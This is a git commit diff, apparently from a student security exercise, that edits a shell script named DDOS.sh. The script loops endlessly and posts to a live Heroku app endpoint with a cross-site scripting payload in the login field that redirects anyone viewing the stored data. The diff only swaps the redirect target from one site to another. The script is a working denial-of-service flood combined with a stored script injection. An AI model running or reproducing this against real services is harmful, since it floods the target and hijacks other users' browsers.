61bd161b77dc0b5ee68879c06e5fcdd1d8e95f46
Sami Ascha <sami.ascha@tufts.edu>
2017-12-08 20:25:59 -0500

    added video

--- security/DDOS.sh
+++ security/DDOS.sh
@@ -2,5 +2,5 @@ while true
 
 do
 
-	curl --data "login=<script> window.location='https://en.wikipedia.org/wiki/Sandy_Balls';</script>&lat=0&lng=0" https://pure-river-81762.herokuapp.com/sendLocation
+	curl --data "login=<script> window.location='https://www.youtube.com';</script>&lat=0&lng=0" https://pure-river-81762.herokuapp.com/sendLocation
 done
